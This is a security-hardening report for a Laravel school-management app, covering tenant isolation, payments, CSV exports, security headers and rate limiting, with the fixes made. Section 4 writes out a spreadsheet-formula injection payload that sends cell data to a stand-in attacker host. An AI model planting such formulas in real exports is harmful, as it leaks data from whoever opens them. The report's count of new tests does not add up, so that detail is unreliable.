# Platform Security Hardening

Status: **Milestone 28 — complete.** A consolidated security-review and
hardening pass across the application delivered through M1–M27. This is
**not** a repeat of functional QA — the existing M1–M27 suites already
prove features work; this milestone specifically hunts for security
failures: tenant-isolation/IDOR gaps, privilege escalation, unsafe input,
file-access bypass, payment/CBT/results/audit/reporting integrity issues,
authentication weaknesses, XSS/CSRF gaps, missing security headers, and
unthrottled sensitive operations.

## 1. Method

Seven parallel, read-only research passes covered the 13 priority areas the
milestone specified, each briefed on the existing architecture and existing
test coverage so they hunted for **genuine gaps**, not restated assurances:

1. Tenant isolation / IDOR
2. Authorization / privilege escalation + mass assignment
3. Private file security + Paystack payment security (M20)
4. CBT / Question Bank integrity (M23/M24)
5. Results integrity (M14/M15/M21) + audit-log security (M26) + reporting/export leakage (M27)
6. Authentication/session security (M2) + XSS/CSRF/HTTP-method security
7. Security headers, secrets exposure, rate limiting, configuration/dependency review

Each pass was required to cite the exact `file:line` for every claim (safe
or vulnerable), cross-check against the existing test suite before
proposing a new test, and report only what it actually verified by reading
the current code — not what the documentation claims.

## 2. Result summary

| Area | Result |
|------|--------|
| Tenant isolation / IDOR | **Clean.** No route-model-binding deviation, no unscoped `DB::table()` call, no nested-resource substitution gap, no `runWithoutScope()` misuse beyond the two sanctioned `PlatformReport` counts. |
| Authorization / privilege escalation | **Clean.** Every one of 155 mutating routes is authorized; self-role-modification and tier-escalation are blocked at the one write path (`MembershipPolicy`); module activation never substitutes for a permission check. |
| Mass assignment | **Clean.** No `$guarded = []`, no privileged/lifecycle column left in any model's `$fillable`, no `$request->all()` anywhere in `app/Http/Controllers`. |
| Private file security | **One coverage gap found and fixed** — see §3. |
| Payment security (M20) | **Clean.** Balance enforcement, reference/context binding, webhook signature + idempotency, server-side verification, amount/currency matching, and secret non-exposure are all correctly implemented and already tested. |
| CBT / Question Bank integrity | **Clean.** Attempt ownership, cross-exam question rejection, server-side timing, answer-exposure prevention, scheduled-release gating, and archived-question rejection are all correctly enforced and tested. |
| Results/academic integrity | **Clean.** No alternate write path exists for scores/grades/totals/positions outside the documented lifecycle and `ResultAdjustment` workflow; `AcademicReport` (M27) is provably read-only. |
| Audit-log security (M26) | **Clean**, with one CSV-injection finding shared with §4 — see below. No edit/destroy route exists; no direct `AuditLog::create()` bypass; actor/tenant attribution can't be forged; redaction is unconditional. |
| Reporting/export leakage (M27) | **One real, exploitable vulnerability found and fixed** — see §4. Tenant/teacher scoping parity between display and export, `PlatformReport`'s confined unscoped queries, and filter-based tenant bypass were all otherwise clean. |
| Authentication/session (M2) | **Clean.** Session regeneration on login, tight per-identity+per-IP login throttling, generic error messages (no enumeration), single-use expiring reset tokens, mid-session account-status ejection, and CSRF enforcement (only the signature-verified Paystack webhook exempted) are all correctly implemented. |
| XSS / raw Blade output | **Clean.** Zero `{!!` occurrences anywhere in 204 Blade files. |
| CSRF / HTTP methods | **Clean.** Zero GET-triggered mutations; `@csrf` present on every form sampled. |
| Security headers | **Gap found and fixed** — see §5. No header middleware existed at all. |
| Rate limiting | **Gap found and fixed** — see §6. Only login/password-reset/registration/member-invite were throttled; payment initiation and every CSV export were not. |
| Secrets/sensitive-data handling | **Clean.** No hardcoded secrets, password hashes correctly hidden, Paystack secret key encrypted at rest and never rendered/logged/exported, audit redaction genuinely case-insensitive-substring on `secret`/`token`/`password`/etc. |
| Configuration/dependency review | **Clean.** `APP_DEBUG` defaults false, no committed `.env`, no Telescope/Horizon/Debugbar installed, session cookie flags correct and production-forced, dependency lists minimal and unremarkable. |

## 3. File security

**Verified clean by inspection**, matching the well-tested logo pattern:
school logos, Learning Materials, and report-card signature routes all
resolve their target record through a tenant-scoped Eloquent query before
touching the disk; uploaded files are stored under Laravel-generated hashed
names (never a client-supplied filename used as a path component); MIME
type is content-sniffed (`mimetypes:`), not trusted from the extension;
`deleteWithFile()`/`putLogo()`/`replaceSignature()` all delete the
underlying file when a row is replaced or removed.

**Gap found: the report-card principal/class-teacher signature routes
(`ReportCardConfigurationController::{update,destroy,show}{Principal,ClassTeacher}Signature`)
had zero feature-test coverage** — the implementation was correct on
inspection, but nothing proved it. Fixed by adding
[tests/Feature/Results/ReportCardSignatureTest.php](../tests/Feature/Results/ReportCardSignatureTest.php)
(9 tests), mirroring `SchoolBrandingTest`'s pattern exactly: upload, tenant
isolation (another school 404s), permission gating (`result.manage` to
write, `result.view` to read, every other role forbidden), file
replacement/deletion, and non-image/undersized-image rejection. All 9 pass
against the existing, unmodified implementation.

## 4. Reporting/export leakage — the one real vulnerability found

**CSV / spreadsheet-formula injection**, across every CSV export in the
application. `fputcsv()` was called directly on untrusted free-text values
(a student's name, a manually-recorded `FeePayment.reference`, a
`Student.graduation_notes` field, an `AuditLog.summary`) with **no
neutralization** of a leading `=`, `+`, `-`, or `@` — the character
Excel/Google Sheets/LibreOffice treats as "this cell is a formula" on open.
A staff member who can edit a student record (or record a manual fee
payment) could set e.g. a preferred name or a graduation note to
`=HYPERLINK("http://attacker.example?x="&A1)` or a DDE-style command
payload; a School Admin who later exports the Academic, Fee, or Promotion
report and opens it in Excel would have that formula execute silently.

**The existing test that claimed to cover this
(`ExportTest::test_export_csv_rows_are_safely_escaped_against_formula_injection_style_content`)
gave false confidence** — it only asserted the response didn't error
(`assertOk()`, `assertNotEmpty()`), never parsed the actual CSV cell
content, and exercised the one export (`StudentReportController`, an
aggregate-counts-only report) that never even renders an individual
student's name — so the vulnerable code path was never touched by the test
at all.

**Fix**: a new shared helper,
[app/Support/Csv/CsvSanitizer.php](../app/Support/Csv/CsvSanitizer.php) —
`CsvSanitizer::row(array $row): array` prefixes any string cell starting
with `=`/`+`/`-`/`@`/tab/CR with a leading single quote (the
OWASP-recommended mitigation, which forces spreadsheet applications to
render the value as literal text). Applied at every data-row `fputcsv()`
call site that writes a free-text field: all 8 M27 report export
controllers, the M25 Entry/Placement Assessment export, and the M26 Audit
Log export (11 controllers total; static header rows and closed-enum-keyed
metric rows were left as-is since they carry no free text). The replacement
test
(`ExportTest::test_export_csv_rows_neutralize_formula_injection_payloads`,
plus a matching audit-log-export test) now `str_getcsv()`-parses the actual
returned row and asserts the malicious cell was prefixed, against an export
(the promotion/graduation report) that genuinely renders both a tampered
student name and a tampered free-text notes field in the same row.

## 5. Security headers — gap found and fixed

**No security-header middleware existed anywhere in the application** — no
`X-Content-Type-Options`, `X-Frame-Options`/clickjacking protection,
`Referrer-Policy`, `Permissions-Policy`, or `Strict-Transport-Security`.
Fixed with a new global middleware,
[app/Http/Middleware/SecurityHeaders.php](../app/Http/Middleware/SecurityHeaders.php),
registered via `$middleware->append(SecurityHeaders::class)` in
`bootstrap/app.php` (applies to every response, including error pages, not
just authenticated/tenant routes):

| Header | Value | Why |
|--------|-------|-----|
| `X-Content-Type-Options` | `nosniff` | stops a browser from MIME-sniffing a response into an executable type |
| `X-Frame-Options` | `DENY` | this app has no legitimate `<iframe>`-embedding use case anywhere — unconditional clickjacking protection |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | avoids leaking a full internal URL (with query strings — session/report filters) to a third-party `Referer` |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=()` | this app never uses any of these browser capabilities — explicitly denies them |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | **only sent when `$request->secure() && app()->isProduction()`** — sending HSTS over a plain local-dev HTTP connection would be actively misleading about the app's real transport security |

Content-Security-Policy was considered per the spec's explicit allowance
("consider CSP only if it can be introduced without breaking the existing
Blade/Tailwind/Alpine/Vite application") and **deliberately not added** —
this app has no external script/style CDNs, no third-party embeds, and
Alpine.js's `x-data`/inline-expression model is fundamentally difficult to
reconcile with a strict CSP without either a broad `unsafe-eval`/nonce
threading exercise (real risk of breaking the existing UI across every
view) or a separate, carefully-scoped follow-up milestone. Documented here
as deferred, not silently skipped.

Proven by
[tests/Feature/Security/SecurityHeadersTest.php](../tests/Feature/Security/SecurityHeadersTest.php)
(3 tests: guest page, authenticated page, HSTS correctly absent over local
HTTP).

## 6. Rate limiting — gap found and fixed

Before this milestone, only login (a tight custom per-identity+per-IP
limiter in `LoginRequest`), password-reset/registration/email-verification
(`throttle:6,1`), and member invites (`throttle:10,1`) were rate-limited.
**Every CSV export route (11 total: 8 M27 reports + the M26 audit-log
export + the M25 entry-assessment export) and the two Paystack
payment-initiation routes (Parent Portal and Student Portal) had no rate
limiting at all** — in a single-shared-database, no-artificial-tenant-limit
architecture, an unthrottled export is a plausible resource-exhaustion
vector, and unthrottled payment initiation both hammers Paystack's own API
and creates unbounded local `PaystackTransaction` rows.

Fixed with two new named limiters registered in
`AppServiceProvider::boot()`:

```php
RateLimiter::for('exports', fn ($request) => Limit::perMinute(20)->by($request->user()?->getAuthIdentifier()));
RateLimiter::for('payment-initiation', fn ($request) => Limit::perMinute(10)->by($request->user()?->getAuthIdentifier()));
```

`throttle:exports` is attached to all 11 export routes; `throttle:payment-initiation`
to both payment-initiation `POST` routes. Both are keyed by the
authenticated user's id (every guarded route already sits behind `auth`).
Ordinary school workflows (CRUD on students/results/attendance/etc.) were
deliberately left unthrottled, per the spec's explicit guidance not to
rate-limit routine operations.

Proven by
[tests/Feature/Security/RateLimitingTest.php](../tests/Feature/Security/RateLimitingTest.php)
(2 tests: 21 export requests → the 21st is `429`; 11 payment-initiation
requests → the 11th is `429`).

## 7. Tenant isolation verification

No fix needed — the existing architecture (`SchoolScope` global scope +
`TenantContext`, explicit tenant-scoped `findOrFail` instead of implicit
route-model binding, `TenantContext::runWithoutScope()` confined to two
counts in `PlatformReport`) was independently re-verified against all 8
attack-path categories the spec named (direct route IDs, nested resources,
relationship traversal, query parameters/filters, exports/downloads/
streams, portal routes, school-context manipulation, update/delete
operations) with no deviation found. Platform administrators were
confirmed to operate exclusively through the existing selected-school
`TenantContext` — no global tenant bypass exists beyond the two sanctioned
`PlatformReport` counts.

## 8. Authorization verification

No fix needed — the centralized M4 Gate/permission model, anti-escalation
guards (`MembershipPolicy`, tier-based `canGrantRole()`), module-activation/
permission orthogonality, and every Teacher/Parent/Student scoping
Authorizer class were independently re-verified with no gap found. Every
mutating route (155 total) carries authorization; no Form Request
unconditionally `return true;`s on a route handling privileged data.

## 9. File security

See §3.

## 10. Payment security

No fix needed — see the "Payment security (M20)" row in §2. Every property
the spec asked to verify (client cannot choose an arbitrary amount,
transaction cannot be reassigned, webhook signature required, webhook
processing idempotent, verification happens server-side, currency/context
checked, secrets never logged/exposed, failed initiation never leaves an
orphaned row) is both correctly implemented and already covered by
`tests/Feature/Paystack/*`.

## 11. CBT security

No fix needed — see the "CBT / Question Bank integrity" row in §2. One
non-blocking coverage suggestion was surfaced (a direct-POST test
explicitly pinning the archived/incompatible-question attach guard,
independent of the UI picker) but was not added — the code path is already
defended by two independent server-side checks and indirectly exercised by
existing tests; this is a minor coverage-hygiene nicety, not a security
gap, and adding it was judged out of proportion to its value.

## 12. Results integrity

No fix needed — see the "Results/academic integrity" row in §2.

## 13. Audit-log security

No fix needed beyond the shared CSV-injection fix (§4), which also applies
to `AuditLogController::export()`'s `summary`/`auditable_label` cells. Every
other audit-log security property (immutability, no forgery path, reliable
actor/tenant attribution, unconditional redaction, export using the same
scoped/gated query as the viewer) was independently re-verified with no
gap found.

One **documentation note, not a vulnerability**: no `app/Reports/*` class
or `Reports/*Controller` currently calls `AuditRecorder::record()` — M27's
own spec language ("audit significant reporting administration actions
where appropriate... report export") was not carried through in its actual
delivery. Since every report/export action is a pure read (no state
mutation), this is a defensible scope choice, not a security defect — but
if "who exported which report, and when" should itself be an accountability
event, that is a targeted, separately-scoped follow-up (a handful of
`AuditRecorder::record()` calls in the export actions), not something this
hardening pass added speculatively.

## 14. Reporting security

See §4.

## 15. HTTP / security headers

See §5.

## 16. Sensitive-data handling

No fix needed — see the "Secrets/sensitive-data handling" row in §2.
Verified: no hardcoded secrets anywhere in the tracked codebase (only
`.env.example`, a fake seeder placeholder, and UI hint text reference
Paystack-key-shaped strings); `User::password`/`remember_token` are
`#[Hidden]`; `SchoolSetting.paystack_secret_key` is `encrypted`-cast, never
rendered in a view (the settings form shows a static placeholder, never the
real value), and is caught by `AuditRecorder`'s blanket `secret`-substring
redaction filter even though the controller also deliberately never
includes it in an audit payload at all (belt-and-suspenders); `.gitignore`
correctly excludes `.env`/`.env.backup`/`.env.production`.

## 17. Rate limiting

See §6.

## 18. Dependency/configuration review

No fix needed. `composer.json`: Laravel `^13.17` (installed `13.31.0`), all
dev-only tooling correctly in `require-dev`. `package.json`: only Alpine.js
as a runtime dependency, Tailwind/Vite as dev tooling — matches CLAUDE.md's
"no React/Vue/Inertia" rule. `.env.example` sets no real secret value
anywhere and documents `APP_DEBUG` safely. `config/session.php`: `http_only`
defaults `true`, `same_site` defaults `lax`, `secure` is env-driven **and**
`AppServiceProvider::boot()` force-overrides `session.secure = true`
whenever `app()->isProduction()` regardless of env misconfiguration. No
Telescope/Horizon/Debugbar/Ignition installed; no diagnostic route
registered.

## 19. Production / deployment recommendations (infrastructure — not implemented in-app)

These are explicitly **out of Laravel's control** and were not attempted in
this milestone, per its own scope boundary:

- **HTTPS termination** — a real TLS certificate at the load
  balancer/reverse proxy. `AppServiceProvider` already forces
  `URL::forceScheme('https')` and `session.secure = true` in production,
  and `SecurityHeaders` sends HSTS once `$request->secure()` is true — but
  the actual certificate and TLS termination is infrastructure's job.
- **A WAF / rate-limiting at the edge** — this milestone added
  application-level rate limiting for the two clearly expensive/sensitive
  route classes (§6); broader DDoS/bot protection belongs at a CDN/WAF
  layer, not in Laravel.
- **Secrets management** — `.env` values (DB credentials, `APP_KEY`, mail
  credentials) should be injected by the deployment platform's secrets
  store, never committed (already enforced by `.gitignore`) or hardcoded.
- **Database backups, replication, and access control** at the
  infrastructure layer — outside this app's remit.
- **Server/OS hardening, firewall rules, intrusion detection** —
  deliberately out of scope per the milestone's own exclusion list (no
  SIEM/SOC/WAF/IDS/IPS/antivirus infrastructure/cloud security architecture
  was implemented, matching the spec).
- **Regular `composer audit`/`npm audit` in CI** — this milestone reviewed
  the dependency list by inspection (no unusual/abandoned packages found)
  but did not set up automated vulnerability scanning; a CI step running
  `composer audit --locked` on every PR is a reasonable, low-cost follow-up
  for whoever owns the deployment pipeline.
- **`APP_DEBUG=false` in the real production `.env`** — the codebase
  defaults this safely (`config/app.php`) and `.env.example` doesn't set it
  true for a production-intended copy, but the actual production
  environment file's value is an operational responsibility, not something
  the app can enforce at runtime.

## 20. Explicitly out of scope (per the milestone's own boundary)

Not implemented, and correctly so: a SIEM, a SOC, a WAF, IDS/IPS,
Elasticsearch/OpenSearch, a security data warehouse, a
vulnerability-management platform, a penetration-testing platform, a new
authentication framework, SSO, enterprise IAM, MFA/2FA as a new feature,
antivirus infrastructure, a secrets-management platform, cloud security
architecture, infrastructure firewall configuration, ISO 27001/PCI/any
compliance certification, or VAPT automation. These remain legitimate
future initiatives, each deserving its own dedicated, deliberately-scoped
milestone rather than being bolted onto a code-level hardening pass.

## 21. Deferred security work

- A dedicated `Content-Security-Policy` — deferred per §5, needs its own
  scoped effort against Alpine's inline-expression model.
- Audit logging of report/export *access* itself (who exported what, when)
  — a documentation note in §13, not a defect; a small, separately-scoped
  addition if the business wants it.
- The CBT direct-POST test suggestion in §11 — genuinely optional coverage
  hygiene, not a gap.
- "Log out other devices" on password change — already documented as a
  deferred M2 decision in `docs/authentication.md`, re-confirmed still
  intentional, not newly deferred by this milestone.
- Automated `composer audit`/`npm audit` in CI — an infrastructure/pipeline
  recommendation (§19), not an application change.
- CSRF-adjacent: no gap found, so nothing deferred there.

## 22. Testing approach

Per the milestone's explicit instruction not to duplicate the existing
~1300-test suite: every one of the seven research passes was required to
search existing tests *before* proposing a new one. The result is a small,
high-signal set of **19 new tests**, every one covering something that was
either a genuine vulnerability (CSV injection — 2 tests) or a genuinely
untested security boundary (report-card signatures — 9 tests; the two new
hardening controls themselves, security headers and rate limiting — 5
tests; three of the original `ExportTest` suite's tests were retained
unchanged since they already proved their own properties correctly). No
area with adequate existing coverage (tenant isolation, authorization, mass
assignment, CBT, payment, results integrity, auth/session, XSS/CSRF) had
tests added — see §2 for the "clean, no fix, no new test" areas and their
existing coverage citations.
